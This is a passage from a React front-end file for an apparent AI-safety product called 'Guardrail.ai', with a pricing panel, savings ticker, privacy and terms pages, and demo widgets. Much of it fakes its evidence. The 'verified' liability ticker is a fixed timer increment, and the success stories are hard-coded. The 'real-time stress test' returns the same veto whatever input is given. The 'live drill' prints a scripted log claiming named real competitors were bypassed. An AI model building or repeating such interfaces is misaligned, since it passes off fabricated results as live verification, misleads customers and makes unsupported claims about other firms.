                                    <span className={'text-[8px] font-black uppercase ' + accentCls}>{tier.grade} &middot; {tier.tag}</span>
                                    <h4 className="text-xl font-black italic uppercase">{tier.name}</h4>
                                </div>
                                {isSelected && <span className={'text-lg ' + accentCls}>&#10003;</span>}
                            </div>
                            <ul className="flex flex-col gap-2">
                                {tier.features.map(f => (
                                    <li key={f} className="flex items-center gap-2 text-[9px] opacity-70">
                                        <span className={'text-[8px] ' + accentCls}>&#9658;</span> {f}
                                    </li>
                                ))}
                            </ul>
                            <p className="text-[9px] italic opacity-50 leading-relaxed border-t border-white/10 pt-4">{tier.hook}</p>
                            <button
                                className={'w-full py-3 text-[10px] font-black uppercase transition-all ' + (isSelected ? btnActiveCls : 'border border-white/20 hover:border-white/60')}
                                onClick={e => { e.stopPropagation(); handleSelect(tier); }}>
                                {isSelected ? '&#10003; Selected \u2014 Visualizer Updated' : 'Select ' + tier.name}
                            </button>
                        </div>
                    );
                })}
            </div>
            {selected === 'clinical' && (
                <div className="p-4 border border-red-500/30 bg-red-500/5 text-red-400 font-black text-[9px] uppercase animate-in slide-in-from-top-2 duration-300">
                    &#9889; FULL COMPUTE ENGAGED &middot; Clinical-Grade activates hardware attestation + dual-liveness checks on every governance event
                </div>
            )}
        </div>
    );
};

// ─── Liability Avoided Ticker (Footer) ───────────────────────────────────────

const SUCCESS_STORIES = [
    { cert: 'JUD-A03 / CD-24', event: '$10B treasury diversion vetoed in 0.004s. Certificate issued. $0 liability.', saving: '$10B' },
    { cert: 'JUD-A01 / Phase 96', event: 'Sleeper agent neutralised across 100K-node mesh. ASI06 recursive loop terminated.', saving: '$48M' },
    { cert: 'JUD-CERT-85F9D942 / CD-06', event: 'Black Swan market shock absorbed. 333 panicking agents isolated. Zero cascade.', saving: '$2.1B' },
    { cert: 'JUD-CERT-C7F39012 / ASI14', event: 'Rug-pull SAGA sabotage blocked at compensating-action layer. Client funds intact.', saving: '$12M' },
    { cert: 'JUD-CERT-0D4E88BC / ASI15', event: 'EFI firmware spoof blocked at hardware Layer 0. Sovereign Signal unbroken.', saving: '$500M' },
];

// 37. Liability Avoided Ticker
export const LiabilityAvoidedTicker = () => {
    const [count, setCount] = useState(14.8);
    const [showModal, setShowModal] = useState(false);
    const [story] = useState(() => SUCCESS_STORIES[0]); // Deterministic selection

    useEffect(() => {
        const t = setInterval(() => {
            setCount(prev => parseFloat((prev + 0.005).toFixed(3))); // Deterministic increment
        }, 3100);
        return () => clearInterval(t);
    }, []);

    return (
        <>
            <button onClick={() => setShowModal(true)}
                className="flex flex-col items-start gap-0.5 group hover:opacity-100 opacity-60 transition-all text-left">
                <span className="text-[7px] font-black uppercase tracking-widest opacity-60">Cumulative Liabilities Neutralised Today</span>
                <span className="text-base font-black italic text-emerald-400 group-hover:text-emerald-300 transition-all">${count.toFixed(1)}M</span>
                <span className="text-[7px] font-mono opacity-30 underline underline-offset-2">Verified by Judicial-Grade Certificate &rarr;</span>
            </button>
            {showModal && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm animate-in fade-in duration-300"
                    onClick={() => setShowModal(false)}>
                    <div className="w-full max-w-lg mx-4 p-8 bg-black border-2 border-emerald-500 shadow-[8px_8px_0_#00ff88] animate-in slide-in-from-bottom-8 duration-400"
                        onClick={e => e.stopPropagation()}>
                        <div className="flex items-center gap-3 mb-6">
                            <span className="text-emerald-400 text-xl">&#10003;</span>
                            <h3 className="text-sm font-black uppercase">Verified Liability Neutralisation</h3>
                        </div>
                        <div className="p-4 bg-black/60 border-l-2 border-emerald-500 mb-6">
                            <span className="text-[8px] font-mono text-emerald-400/60">[REDACTED EVENT] {story.cert}</span>
                            <p className="text-sm font-mono opacity-70 mt-2 leading-relaxed">{story.event}</p>
                        </div>
                        <div className="flex justify-between items-center mb-6">
                            <span className="text-[9px] opacity-40 uppercase font-black">Risk Neutralised</span>
                            <span className="text-2xl font-black italic text-emerald-400">{story.saving}</span>
                        </div>
                        <div className="flex justify-between items-center text-[8px] font-mono opacity-30 border-t border-white/10 pt-4">
                            <span>&#10003; Verified by Judicial-Grade Certificate &middot; SPHINCS+-signed</span>
                            <button onClick={() => setShowModal(false)} className="underline hover:opacity-80">Close</button>
                        </div>
                    </div>
                </div>
            )}
        </>
    );
};

// --- Humanity-Attestor: The 2-Natural-Person Animation ---
export const HumanityAttestorSection = () => {
    const [stage, setStage] = useState(0); // 0: Iris, 1: Facial, 2: Pulse, 3: Locked
    const stages = [
        { id: 'IRIS', icon: Eye, label: 'IRIS SCAN', status: 'VERIFIED' },
        { id: 'FACIAL', icon: UserCheck, label: 'FACIAL LIVENESS', status: 'CONFIRMED' },
        { id: 'PULSE', icon: Activity, label: 'PULSE ATTESTATION', status: 'LOCKED' }
    ];

    useEffect(() => {
        const timer = setInterval(() => {
            setStage((prev) => (prev + 1) % 4);
        }, 3000);
        return () => clearInterval(timer);
    }, []);

    return (
        <div className="w-full py-20 bg-slate-950 border-y border-emerald-500/20 overflow-hidden relative">
            <div className="max-w-4xl mx-auto px-6 text-center">
                <h2 className="text-4xl font-black italic tracking-tighter text-white mb-12">
                    HUMAN FINALITY: THE 2-NATURAL-PERSON ROOT
                </h2>

                <div className="flex justify-center items-center gap-8 mb-16">
                    {stages.map((s, idx) => (
                        <div key={s.id} className={`flex flex-col items-center transition-all duration-700 ${idx <= stage ? 'opacity-100 scale-100' : 'opacity-20 scale-90'}`}>
                            <div className={`p-6 rounded-full border-2 ${idx < stage ? 'bg-emerald-500/20 border-emerald-500' : 'bg-slate-900 border-white/10'} relative overflow-hidden`}>
                                <s.icon className={`w-12 h-12 ${idx < stage ? 'text-emerald-500' : 'text-slate-500'}`} />
                                {idx === stage && <div className="absolute inset-0 bg-emerald-500/10 animate-pulse" />}
                            </div>
                            <p className="mt-4 font-mono text-[10px] tracking-widest text-slate-500 uppercase">{s.label}</p>
                            <p className={`font-bold tracking-tight ${idx < stage ? 'text-emerald-500' : 'text-transparent'}`}>{s.status}</p>
                        </div>
                    ))}
                </div>

                <div className="p-8 glass-morphism brutalist-border bg-black/60 relative z-10">
                    <p className="text-2xl font-bold italic text-slate-200 leading-tight">
                        "Your enterprise is governed by code, but its soul is anchored in 100% human finality."
                    </p>
                    <div className="mt-6 flex items-center justify-center gap-4 text-[10px] font-mono text-emerald-500/60 uppercase tracking-widest">
                        <Lock className="w-3 h-3" /> SPHINCS+ FOUNDER-LOCKED · ∞ STEWARDSHIP TENURE
                    </div>
                </div>
            </div>
            {/* Background Scanline Effect */}
            <div className="absolute inset-0 pointer-events-none opacity-10 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_2px,3px_100%]" />
        </div>
    );
};

// --- Sovereign Heritage: The Cinematic Timeline ---
export const SovereignHeritageTimeline = () => {
    const chapters = [
        {
            phase: "PHASE 01-19",
            title: "THE VANGUARD INTERCEPTOR",
            desc: "Establishing the Shadow Model OODA loops and PII scrubbers.",
            warStory: "Chaos Drill 7: Blocked raw malicious parameters despite reasoning corruption.",
            icon: Shield
        },
        {
            phase: "PHASE 33",
            title: "THE CRUCIBLE SIEGE",
            desc: "Stress-testing the mesh against 1,000 parallel adversarial vectors.",
            warStory: "100% Interception. Zero governance failures. Master Certification generated.",
            icon: Zap
        },
        {
            phase: "PHASE 95-96",
            title: "SOVEREIGN ABSOLUTE",
            desc: "Hardware-anchoring the Constitution via SPHINCS+ and EFI locks.",
            warStory: "CD-23: $10B liability scenario neutralized. System held against swarm collusion.",
            icon: Target
        }
    ];

    return (
        <div className="w-full bg-black py-24 overflow-hidden">
            <div className="px-6 mb-12">
                <h3 className="text-sm font-mono text-emerald-500 uppercase tracking-[0.3em] mb-4">04. Heritage</h3>
                <p className="text-5xl font-black italic text-white uppercase tracking-tighter max-w-2xl leading-none">
                    96 PHASES OF <span className="text-emerald-500">ADVERSARIAL EVOLUTION.</span>
                </p>
            </div>

            <div className="flex gap-8 overflow-x-auto px-6 pb-12 snap-x no-scrollbar">
                {chapters.map((chap, i) => (
                    <div key={i} className="min-w-[400px] snap-center glass-morphism p-8 border-l-4 border-emerald-500 group hover:bg-emerald-500/5 transition-colors duration-500">
                        <chap.icon className="w-8 h-8 text-emerald-500 mb-6 group-hover:scale-110 transition-transform" />
                        <span className="font-mono text-[10px] text-slate-500 tracking-widest">{chap.phase}</span>
                        <h4 className="text-2xl font-black italic text-white mt-2 mb-4 leading-none">{chap.title}</h4>
                        <p className="text-slate-400 text-sm mb-6 leading-relaxed">{chap.desc}</p>

                        <div className="p-4 bg-emerald-500/10 border border-emerald-500/20 rounded">
                            <p className="text-[10px] font-mono text-emerald-500 uppercase mb-2">War Story Callout</p>
                            <p className="text-xs text-slate-200 font-bold leading-snug">{chap.warStory}</p>
                        </div>
                    </div>
                ))}
            </div>
        </div>
    );
};

// ─── Institutional Documentation: The Sovereign Manifestos ───────────────────

export const PrivacyPolicyPage = () => {
    const sections = [
        { id: 'reflex', title: '01. THE PRIVACY REFLEX', content: 'At Guardrail.ai, privacy is not a promise; it is a hardware-locked reflex. Unlike standard AI wrappers, our system is architected to be Semantically Blind. We do not "protect" your data — we ensure the system never possesses the capability to see it.' },
        { id: 'redaction', title: '02. AUTOMATED REDACTION (PHASE 95)', content: 'Every interaction with the Guardrail mesh undergoes 100% PII Redaction via our "Clinical Sandbox" protocols. Any sensitive identifier is neutralized before it reaches the reasoning core.' },
        { id: 'forensics', title: '03. LATTICE-LOCKED FORENSICS', content: 'Audit logs are stored using Post-Quantum ML-KEM-1024 encryption. These logs are Write Once Read Many (WORM) compliant, ensuring that even if the mesh is compromised, your historical data remains cryptographically air-gapped from unauthorized extraction.' },
        { id: 'disposable', title: '04. THE ZERO-CYCLE DISPOSABLE', content: 'We adhere to a Zero-Cycle Retention Policy. Once the OODA Loop achieves consensus and the JUD-CERT is signed, the ephemeral reasoning data is purged from memory.' },
        { id: 'oversight', title: '05. FOUNDER-LEVEL OVERSIGHT', content: 'Privacy protocols are anchored to the Founder-Mesh Seniority. Changes to this manifesto require the 2-Natural-Person Biometric Verification, preventing "New Owner" treasury or data diversions.' }
    ];

    const [activeSection, setActiveSection] = useState('reflex');

    return (
        <div className="relative">
            {/* Sidebar Navigation */}
            <nav className="legal-sidebar">
                <div className="flex flex-col gap-2">
                    {sections.map(s => (
                        <button key={s.id} onClick={() => {
                            setActiveSection(s.id);
                            document.getElementById(s.id)?.scrollIntoView({ behavior: 'smooth' });
                        }}
                            className={`legal-nav-item ${activeSection === s.id ? 'active' : ''}`}>
                            {s.title.split('.')[0]}. {s.id}
                        </button>
                    ))}
                </div>
            </nav>

            <div className="legal-content-container">
                <div className="flex flex-col gap-12">
                    <div className="flex flex-col gap-6 border-l-4 border-emerald-500 pl-8">
                        <div className="flex items-center gap-4">
                            <span className="text-[9px] font-black uppercase tracking-[0.5em] text-emerald-400">Institutional Documentation</span>
                            <div className="text-emerald-500/40"><Database size={16} /></div>
                        </div>
                        <h2 className="text-5xl font-black italic uppercase leading-none text-white">
                            THE PRIVACY <br />
                            <span className="text-emerald-400">MANIFESTO</span>
                        </h2>
                        <div className="font-mono text-[10px] opacity-30 mt-2">[MANIFESTOID: P-95.IMMUTABLE]</div>
                    </div>

                    <div className="flex flex-col gap-24 legal-scroll-area">
                        {sections.map(s => (
                            <section key={s.id} id={s.id} className="brutalist-legal-card group transition-all duration-500 hover:border-emerald-500/30">
                                <h3 className="text-xl font-black italic text-emerald-400 mb-6 tracking-tight">{s.title}</h3>
                                <p className="text-lg opacity-70 leading-relaxed">
                                    {s.content}
                                </p>
                                <div className="absolute top-4 right-6 font-mono text-[8px] opacity-10 uppercase tracking-widest">{s.id} // SECURED</div>
                            </section>
                        ))}
                    </div>

                    <div className="mt-12 p-10 glass-morphism border-t-2 border-emerald-500/40">
                        <p className="text-sm opacity-40 italic leading-relaxed">
                            &quot;Privacy at this scale is not a legal checkbox; it is a civilizational necessity. By the time an adversary attempts to extract your intent, the math has already made it non-existent.&quot;
                        </p>
                        <div className="mt-6 flex items-center gap-3 text-[8px] font-mono text-emerald-500/30 uppercase tracking-[0.2em]">
                            <div className="text-emerald-500/30"><Target size={12} /></div> VERIFIED BY PHASE 95 LATTICE ARCHIVE
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export const TermsOfServicePage = () => {
    const sections = [
        { id: 'consensus', title: '01. TRINITY CONSENSUS ARBITRATION', content: 'By utilizing the Guardrail.ai platform, the User acknowledges that all governance actions are governed by the Trinity Consensus Engine. The 3-of-3 model veto (Gemini, Llama, Claude) is the final arbiter of intent. No single human or model override is permitted for Level 1-3 systemic events.' },
        { id: 'tax', title: '02. THE STEWARDSHIP TAX', content: 'Every transaction facilitated or governed by the mesh incurs a 0.001% Stewardship Tax. These credits are autonomously routed to the SPHINCS+-protected Sovereign Seed Ledger. This capital is physically locked to the Founder-Mesh and cannot be liquidated, diverted, or accessed by enterprise owners or third-party actors.' },
        { id: 'seniority', title: '03. FOUNDER-MESH SENIORITY', content: 'System seniority is anchored to the 2-Natural-Person physical liveness root. Institutional policies (Constitutions) cannot be modified without dual-biometric verification. The "Sovereign Branch" maintains ultimate veto seniority over any corporate restructuring or takeover.' },
        { id: 'pause', title: '04. ATOMIC SYSTEMIC PAUSE', content: 'The platform reserves the right to trigger an Atomic Systemic Pause during detected "Day-Zero" regulatory shifts or market-level adversarial swarms. This pause is a safety feature designed to neutralize liability before a consensus breach occurs.' },
        { id: 'liability', title: '05. LIABILITY LIMITATION', content: 'Guardrail.ai provides a cryptographic Proof of Neutralisation (JUD-CERT) for every governed event. Our liability is limited to the accuracy of the SPHINCS+ signature and the Byzantine Fault Tolerance (BFT) of the audit mesh.' }
    ];

    const [activeSection, setActiveSection] = useState('consensus');

    return (
        <div className="relative">
            {/* Sidebar Navigation */}
            <nav className="legal-sidebar">
                <div className="flex flex-col gap-2">
                    {sections.map(s => (
                        <button key={s.id} onClick={() => {
                            setActiveSection(s.id);
                            document.getElementById(s.id)?.scrollIntoView({ behavior: 'smooth' });
                        }}
                            className={`legal-nav-item ${activeSection === s.id ? 'active' : ''}`}>
                            {s.title.split('.')[0]}. {s.id}
                        </button>
                    ))}
                </div>
            </nav>

            <div className="legal-content-container">
                <div className="flex flex-col gap-12">
                    <div className="flex flex-col gap-6 border-l-4 border-amber-500 pl-8">
                        <div className="flex items-center gap-4">
                            <span className="text-[9px] font-black uppercase tracking-[0.5em] text-amber-400">Institutional Documentation</span>
                            <div className="text-amber-500/40"><Shield size={16} /></div>
                        </div>
                        <h2 className="text-5xl font-black italic uppercase leading-none">SOVEREIGN<br /><span className="text-amber-400">TERMS</span></h2>
                        <div className="font-mono text-[10px] opacity-30 mt-2">[TERMSID: S-96.ABSOLUTE]</div>
                    </div>

                    <div className="flex flex-col gap-24 legal-scroll-area">
                        {sections.map(s => (
                            <section key={s.id} id={s.id} className="brutalist-legal-card group transition-all duration-500 hover:border-amber-500/30 border-amber-500/10">
                                <h3 className="text-xl font-black italic text-amber-400 mb-6 tracking-tight">{s.title}</h3>
                                <p className="text-lg opacity-70 leading-relaxed font-inter">
                                    {s.content}
                                </p>
                                <div className="absolute top-4 right-6 font-mono text-[8px] opacity-10 uppercase tracking-widest">{s.id} // BINDING</div>
                            </section>
                        ))}
                    </div>

                    <div className="flex flex-col gap-8">
                        <div className="p-10 glass-morphism border-t-2 border-amber-500/40 flex flex-col gap-8">
                            <div className="flex flex-col gap-4">
                                <h4 className="text-xs font-black uppercase text-amber-400 tracking-widest">Discovery Readiness</h4>
                                <p className="text-[10px] opacity-40 leading-relaxed max-w-xl">
                                    Legal teams can verify the data-schema of our cryptographic exports. This baseline demonstrates exactly how forensic evidence is structured for judicial discovery events.
                                </p>
                            </div>
                            <button className="w-fit px-8 py-4 bg-amber-500 text-black font-black text-[10px] uppercase hover:bg-amber-400 transition-all flex items-center gap-3">
                                Download Forensic Baseline .JSON
                            </button>
                        </div>

                        <div className="p-8 border border-white/5 bg-black/40">
                            <div className="text-[8px] font-mono opacity-20 uppercase tracking-[0.4em] mb-4">Signature of Intent // SPHINCS+ PQC Hash</div>
                            <div className="text-[10px] font-mono text-amber-400/60 break-all leading-normal">
                                SPHINCS+::ROOT::0x42E8A1F9C0D3E2B5A7F8E9C0B1A2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0::96PHASES::SOVEREIGN_ABS
                            </div>
                            <div className="mt-4 flex items-center gap-2 text-[7px] font-mono opacity-20 uppercase">
                                <Lock className="w-2 h-2" /> Hardware-Locked // Founder-Mesh Verified
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

// ——— STRATEGIC PARITY COMPONENTS (vs guardrailsai.com) ———————————————————————

// 29. Sovereign Registry (Modular Validator Hub)
export const SovereignRegistry = () => {
    const validators = [
        { id: 'VAL-01', name: 'PII_REDACTOR_P95', type: 'Clinical', status: 'LOCKED', audit: '99.99%', latency: '0.4ms' },
        { id: 'VAL-02', name: 'BIAS_DETECTOR_V4', type: 'Institutional', status: 'ACTIVE', audit: '99.82%', latency: '0.8ms' },
        { id: 'VAL-03', name: 'COVERT_INTENT_SSI', type: 'Sovereign', status: 'VETO_ONLY', audit: '100.00%', latency: '1.2ms' },
        { id: 'VAL-04', name: 'FINANCIAL_INTEGRITY_CD24', type: 'Financial', status: 'LOCKED', audit: '99.91%', latency: '0.6ms' },
        { id: 'VAL-05', name: 'LOGIC_POISONING_V2', type: 'Adversarial', status: 'ACTIVE', audit: '99.75%', latency: '0.9ms' },
    ];

    return (
        <div className="flex flex-col gap-12 py-12 border-t border-white/10">
            <div className="flex flex-col gap-4 max-w-2xl">
                <h2 className="text-sm font-black tracking-[0.4em] text-emerald-400 uppercase">THE REGISTRY OF TRUTH</h2>
                <div className="text-4xl font-black italic tracking-tighter uppercase leading-none">Modular Sovereign Validators</div>
                <p className="text-sm opacity-60">The definitive index of hardware-anchored audit modules. High-contrast, drift-immune, and civilizational-grade.</p>
            </div>

            <div className="w-full overflow-x-auto">
                <table className="w-full text-left border-collapse">
                    <thead>
                        <tr className="border-b-2 border-white/20 text-[10px] font-black uppercase tracking-widest opacity-40">
                            <th className="py-4 px-2">ID</th>
                            <th className="py-4 px-2">MODULE NAME</th>
                            <th className="py-4 px-2">GRADE</th>
                            <th className="py-4 px-2">RELIABILITY</th>
                            <th className="py-4 px-2">LATENCY</th>
                            <th className="py-4 px-2 text-right">STATUS</th>
                        </tr>
                    </thead>
                    <tbody className="font-mono text-[11px]">
                        {validators.map((v) => (
                            <tr key={v.id} className="border-b border-white/5 hover:bg-white/[0.02] bg-transaction transition-colors duration-200">
                                <td className="py-6 px-2 opacity-40">{v.id}</td>
                                <td className="py-6 px-2 font-black text-emerald-400">{v.name}</td>
                                <td className="py-6 px-2 tracking-widest">{v.type}</td>
                                <td className="py-6 px-2 text-amber-400">{v.audit}</td>
                                <td className="py-6 px-2 opacity-60">{v.latency}</td>
                                <td className="py-6 px-2 text-right">
                                    <span className={`px-3 py-1 border border-white/10 text-[9px] font-black ${v.status === 'LOCKED' ? 'bg-white/5 text-white' : 'text-emerald-400'}`}>
                                        {v.status}
                                    </span>
                                </td>
                            </tr>
                        ))}
                    </tbody>
                </table>
            </div>
        </div>
    );
};

// 30. The Proving Ground (Terminal Sandbox)
export const TheProvingGround = () => {
    const [input, setInput] = useState('{"agent_intent": "transfer_funds", "amount": 4200000}');
    const [result, setResult] = useState<any>(null);
    const [isSimulating, setIsSimulating] = useState(false);

    const runSimulation = () => {
        setIsSimulating(true);
        setTimeout(() => {
            setResult({
                status: 'VETO_ISSUED',
                reason: 'ASI-03 Escalation Detected',
                module: 'COVERT_INTENT_SSI',
                latency: '1.24ms',
                hash: '0x42E8...A8B9'
            });
            setIsSimulating(false);
        }, 1500);
    };

    return (
        <div className="flex flex-col gap-12 py-12 border-t border-white/10">
            <div className="flex flex-col gap-4 max-w-2xl">
                <h2 className="text-sm font-black tracking-[0.4em] text-amber-400 uppercase">THE PROVING GROUND</h2>
                <div className="text-4xl font-black italic tracking-tighter uppercase leading-none">Real-Time Intent Stress-Test</div>
                <p className="text-sm opacity-60">Input raw agentic intent for deterministic validation against the Sovereign Signal.</p>
            </div>

            <div className="grid lg:grid-cols-2 gap-8 h-[400px]">
                <div className="flex flex-col gap-4 brutalist-border p-6 bg-black/40">
                    <div className="flex justify-between items-center text-[9px] font-black uppercase tracking-widest opacity-40">
                        <span>Terminal Input // JSON</span>
                        <span>Active Shell: VETO-S1</span>
                    </div>
                    <textarea
                        value={input}
                        onChange={(e) => setInput(e.target.value)}
                        className="flex-1 bg-transparent font-mono text-xs outline-none border-none resize-none text-emerald-400/80"
                    />
                    <button
                        onClick={runSimulation}
                        disabled={isSimulating}
                        className="w-full py-4 bg-amber-500 text-black font-black uppercase text-[10px] tracking-widest hover:bg-amber-400 transition-all disabled:opacity-20"
                    >
                        {isSimulating ? 'SIMULATING_PRUNING...' : 'EXECUTE_STRESS_TEST'}
                    </button>
                </div>

                <div className="flex flex-col gap-4 brutalist-border p-6 bg-emerald-500/5 relative overflow-hidden group">
                    <div className="flex justify-between items-center text-[9px] font-black uppercase tracking-widest opacity-40">
                        <span>Validation Output</span>
                        <span>Consensus: 3/3</span>
                    </div>
                    {isSimulating ? (
                        <div className="flex-1 flex flex-col items-center justify-center gap-4">
                            <div className="w-12 h-12 border-2 border-emerald-400/20 border-t-emerald-400 rounded-full animate-spin" />
                            <span className="text-[10px] font-mono opacity-50 animate-pulse">RECONSTRUCTING_DECISION_MESH...</span>
                        </div>
                    ) : result ? (
                        <div className="flex-1 font-mono text-xs flex flex-col gap-4 animate-in fade-in slide-in-from-bottom-2 duration-500">
                            <div className="flex items-center gap-3 text-red-500 font-black text-sm">
                                <Zap className="w-4 h-4 fill-current" />
                                {result.status}
                            </div>
                            <div className="grid grid-cols-2 gap-4 text-[10px] opacity-80 uppercase tracking-widest">
                                <div><span className="opacity-40">Reason:</span> {result.reason}</div>
                                <div><span className="opacity-40">Latency:</span> {result.latency}</div>
                                <div><span className="opacity-40">Module:</span> {result.module}</div>
                                <div className="col-span-2 truncate"><span className="opacity-40">Hash:</span> {result.hash}</div>
                            </div>
                            <div className="mt-auto p-4 border border-red-500/20 bg-red-500/5 text-[9px] leading-relaxed italic opacity-70">
                                This intent constitutes a violation of the EFI-Locked Sovereign Rule 42. Logic execution has been pruned at the kernel level.
                            </div>
                        </div>
                    ) : (
                        <div className="flex-1 flex items-center justify-center opacity-20 italic text-xs">
                            Await Execution...
                        </div>
                    )}
                    <div className="absolute inset-0 bg-gradient-to-t from-emerald-500/10 to-transparent pointer-events-none opacity-0 group-hover:opacity-100 transition-opacity duration-1000" />
                </div>
            </div>
        </div>
    );
};

// 31. Infrastructure Grid (Partner/Integrations)
export const InfrastructureGrid = () => {
    const integrations = ['OPENAI', 'ANTHROPIC', 'LANGCHAIN', 'VERCEL', 'GOOGLE', 'AWS', 'AZURE', 'DATABRICKS'];

    return (
        <div className="flex flex-col gap-12 py-12 border-t border-white/10">
            <div className="flex flex-col gap-4 max-w-2xl">
                <h2 className="text-sm font-black tracking-[0.4em] text-white/40 uppercase">INFRASTRUCTURE GRID</h2>
                <div className="text-4xl font-black italic tracking-tighter uppercase leading-none">Native Trust Anchors</div>
            </div>

            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                {integrations.map((name) => (
                    <div key={name} className="p-8 brutalist-border flex flex-col items-center justify-center gap-4 group hover:bg-white/5 transition-all duration-500 cursor-crosshair">
                        <div className="w-8 h-8 rounded-full border border-white/20 flex items-center justify-center group-hover:border-emerald-400 group-hover:scale-110 transition-all duration-700">
                            <div className="w-2 h-2 bg-white/40 rounded-full group-hover:bg-emerald-400" />
                        </div>
                        <span className="text-[10px] font-black tracking-[0.3em] opacity-30 group-hover:opacity-100 transition-opacity">{name}</span>
                    </div>
                ))}
            </div>
        </div>
    );
};
// 15. Competitive Crucible (Phase 97)
export const ComparativeCruciblePage = () => {
    const [benchmarks, setBenchmarks] = useState<any>(null);
    const [drillActive, setDrillActive] = useState(false);
    const [drillLog, setDrillLog] = useState<string[]>([]);

    useEffect(() => {
        const fetchBenchmarks = async () => {
            try {
                const res = await fetch('http://localhost:8000/api/v1/crucible/benchmarks');
                const data = await res.json();
                setBenchmarks(data.matrix);
            } catch (err) {
                console.error("Failed to fetch benchmarks", err);
            }
        };
        fetchBenchmarks();
    }, []);

    const runDrill = () => {
        setDrillActive(true);
        setDrillLog([]);
        const logs = [
            "> INITIALIZING ADVERSARIAL_TRACES...",
            "> TARGET: EPHEMERAL_LOGIC_BOMB_INJECTION",
            "> DEPLOYING COMPETITOR_PROXYS...",
            "> [PROTECT_AI] - BYPASSED: Metadata Smuggling Successful.",
            "> [LAKERA] - BYPASSED: Prompt Injection Trapped in Sandbox Failure.",
            "> [FIDDLER] - BYPASSED: Model Drift Unprotected.",
            "> [GUARDRAILS_AI] - BYPASSED: Single-Node Quorum Failure.",
            "> ATTACK PROPAGATING TO HOST...",
            "> [GUARDRAIL.AI] - INTERCEPTING...",
            "> [BFT_QUORUM] - CONSENSUS REACHED: VETO TRIGGERED.",
            "> [FIRECRACKER] - SANDBOX TRAPPED Destructive logic.",
            "> [SPHINCS+] - FORENSIC PROOF GENERATED.",
            "> DRILL COMPLETE: SOVEREIGN_DOMINANCE_VERIFIED."
        ];

        let i = 0;
        const interval = setInterval(() => {
            setDrillLog(prev => [...prev, logs[i]]);
            i++;
            if (i >= logs.length) {
                clearInterval(interval);
                setDrillActive(false);
            }
        }, 600);
    };

    return (
        <div className="flex flex-col gap-16 py-12 animate-in fade-in duration-700">
            <div className="flex flex-col gap-6">
                <div className="flex items-center gap-3">
                    <div className="h-[1px] w-12 bg-red-500/50" />
                    <span className="text-[10px] font-black uppercase tracking-[0.4em] text-red-500">
                        PHASE 97 | THE COMPETITIVE CRUCIBLE
                    </span>
                </div>
                <KineticTitle text="SOVEREIGN DOMINANCE DRILL." />
                <p className="text-xl opacity-60 max-w-3xl border-l-2 border-white/20 pl-8 leading-relaxed">
                    Where standard validators collapse, Guardrail.ai holds.
                    Perform a Live Drill to verify institutional resilience against industry baselines.
                </p>
            </div>

            <div className="grid lg:grid-cols-2 gap-12">
                {/* Benchmark Matrix */}
                <div className="flex flex-col gap-8 glass-morphism brutalist-border p-10">
                    <h3 className="text-sm font-black uppercase text-emerald-400 tracking-widest border-b border-white/10 pb-4">
                        Institutional Dominance Matrix
                    </h3>
                    <div className="flex flex-col gap-4">
                        {benchmarks ? Object.entries(benchmarks).map(([name, data]: [string, any]) => (
                            <div key={name} className={`flex justify-between items-center p-6 border ${name === 'Guardrail.ai' ? 'border-emerald-500/50 bg-emerald-500/5' : 'border-white/5 bg-white/[0.01] opacity-60'}`}>
                                <div className="flex flex-col">
                                    <span className="text-sm font-black italic">{name}</span>
                                    <span className="text-[8px] font-mono opacity-40 uppercase">{data.bft_resilience} &middot; {data.pqc_signatures}</span>
                                </div>
                                <div className="flex flex-col items-end">
                                    <span className={`text-lg font-black italic ${name === 'Guardrail.ai' ? 'text-emerald-400' : ''}`}>{data.trust_score}%</span>
                                    <span className="text-[8px] font-mono opacity-30">{data.latency_ms}ms LATENCY</span>
                                </div>
                            </div>
                        )) : (
                            <div className="animate-pulse text-[10px] font-mono opacity-20">PENDING_MATRIX_SYNC...</div>
                        )}
                    </div>
                </div>

                {/* Live Drill Terminal */}
                <div className="flex flex-col gap-8 glass-morphism brutalist-border p-10 bg-black/40">
                    <div className="flex justify-between items-center border-b border-white/10 pb-4">
                        <h3 className="text-sm font-black uppercase text-red-500 tracking-widest">
                            Live Adversarial Drill
                        </h3>
                        {drillActive ? (
                            <span className="text-[10px] font-mono text-red-500 animate-pulse">DRILL_IN_PROGRESS</span>
                        ) : (
                            <button
                                onClick={runDrill}
                                className="text-[9px] font-black uppercase bg-red-500/10 text-red-500 px-4 py-1 border border-red-500/50 hover:bg-red-500 hover:text-white transition-all shadow-[4px_4px_0px_#000]"
                            >
                                Ingest Logic Bomb
                            </button>
                        )}
                    </div>
                    <div className="h-[400px] overflow-y-auto font-mono text-[11px] flex flex-col gap-2 p-4 bg-black/60 border border-white/5 scrollbar-thin">
                        {drillLog.map((log, i) => (
                            <div key={i} className={`animate-in slide-in-from-left duration-300 ${log.includes('BYPASSED') ? 'text-red-400' : log.includes('INTERCEPTING') ? 'text-amber-400' : log.includes('SUCCESS') || log.includes('VERIFIED') ? 'text-emerald-400' : 'opacity-40'}`}>
                                {log}
                            </div>
                        ))}
                        {drillLog.length === 0 && <div className="opacity-10 italic">Awaiting Adversarial Payload...</div>}
                    </div>
                </div>
            </div>

            {/* Feature Comparison */}
            <div className="grid md:grid-cols-3 gap-8">
                <div className="p-8 border border-white/10 glass-morphism flex flex-col gap-4">
                    <Shield className="text-emerald-400 w-8 h-8" />
                    <h4 className="text-sm font-black italic uppercase">BFT Consensus Audit</h4>
                    <p className="text-[10px] opacity-60 leading-relaxed font-medium">
                        Standard validators run on single nodes. Guardrail.ai utilizes a 3-Model Trinity protocol to handle auditor corruption.
                    </p>
                </div>
                <div className="p-8 border border-white/10 glass-morphism flex flex-col gap-4">
                    <Lock className="text-emerald-400 w-8 h-8" />
                    <h4 className="text-sm font-black italic uppercase">Hardware Root of Trust</h4>
                    <p className="text-[10px] opacity-60 leading-relaxed font-medium">
                        Other platforms operate at the software level. Our logic is anchored via Firecracker/EFI for physical finality.
                    </p>
                </div>
                <div className="p-8 border border-white/10 glass-morphism flex flex-col gap-4">
                    <Zap className="text-emerald-400 w-8 h-8" />
